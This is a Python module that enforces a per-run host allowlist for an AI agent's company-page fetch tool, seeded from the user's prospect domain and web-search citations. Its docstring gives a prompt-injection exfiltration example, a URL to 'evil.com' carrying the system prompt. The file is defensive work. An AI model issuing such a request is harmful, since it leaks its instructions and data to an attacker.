"""URL allowlist enforcement for outbound fetches.

§7.1 #4 and §7.2 #1: fetch_company_page can only reach URLs whose hosts
appear in a dynamic allowlist. The allowlist is seeded from:

  1. The caller's original input domain (the prospect they asked about).
  2. Any host that appeared in a `web_search` citation earlier in the run.

This gives Claude exactly one legitimate fetch surface and closes the
exfiltration loop — a prompt-injected URL like
`https://evil.com/?leak=<system-prompt>` is not on the allowlist and
fails closed.

A second outbound guard lives at the corporate firewall level (§7.2 #4);
this is defense in depth, not the only defense.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from urllib.parse import urlparse


class UrlNotAllowed(Exception):
    """Raised when a fetch is attempted against a host not on the allowlist."""


@dataclass
class UrlAllowlist:
    """Per-run allowlist for fetch_company_page.

    Three buckets:
      - `seed_hosts`: from the caller's input (the prospect domain).
      - `citation_hosts`: accumulated from web_search results during the run.
      - `infrastructure_hosts`: upstream APIs we talk to (SAM, USAspending,
        SBIR, Anthropic). These are guarded by their own HTTP clients, not
        this allowlist — listed here only so the audit log shows the
        complete egress profile.
    """

    seed_hosts: set[str] = field(default_factory=set)
    citation_hosts: set[str] = field(default_factory=set)
    infrastructure_hosts: set[str] = field(
        default_factory=lambda: {
            "api.anthropic.com",
            "api.usaspending.gov",
            "api.sam.gov",
            "api.sbir.gov",
        }
    )

    def seed(self, *hosts_or_urls: str) -> None:
        """Add one or more initial allowed hosts from caller input."""
        for item in hosts_or_urls:
            host = _host_of(item)
            if host:
                self.seed_hosts.add(host)

    def accept_citation(self, url: str) -> None:
        """Promote a host seen in a web_search citation to allowed."""
        host = _host_of(url)
        if host:
            self.citation_hosts.add(host)

    def allows(self, url: str) -> bool:
        host = _host_of(url)
        if not host:
            return False
        # Match on registrable-domain suffix to handle subdomains ("www.",
        # "blog.", "ir.") but NOT to match every host on the same TLD.
        return any(
            host == h or host.endswith(f".{h}")
            for h in (self.seed_hosts | self.citation_hosts)
        )

    def check(self, url: str) -> None:
        if not self.allows(url):
            raise UrlNotAllowed(
                f"Host {_host_of(url)!r} is not on this run's allowlist. "
                f"seed_hosts={sorted(self.seed_hosts)}, "
                f"citation_hosts={sorted(self.citation_hosts)}"
            )

    def snapshot(self) -> dict[str, list[str]]:
        """Audit-friendly view. Used in the trace and the final brief."""
        return {
            "seed_hosts": sorted(self.seed_hosts),
            "citation_hosts": sorted(self.citation_hosts),
            "infrastructure_hosts": sorted(self.infrastructure_hosts),
        }


def _host_of(url_or_host: str) -> str:
    """Extract the lowercased hostname from a URL or bare host string."""
    text = url_or_host.strip().lower()
    if "://" in text:
        parsed = urlparse(text)
        host = parsed.hostname or ""
    else:
        # Treat as bare host; strip any path suffix if the caller passed one.
        host = text.split("/", 1)[0]
    # Strip port if present.
    if ":" in host:
        host = host.split(":", 1)[0]
    return host
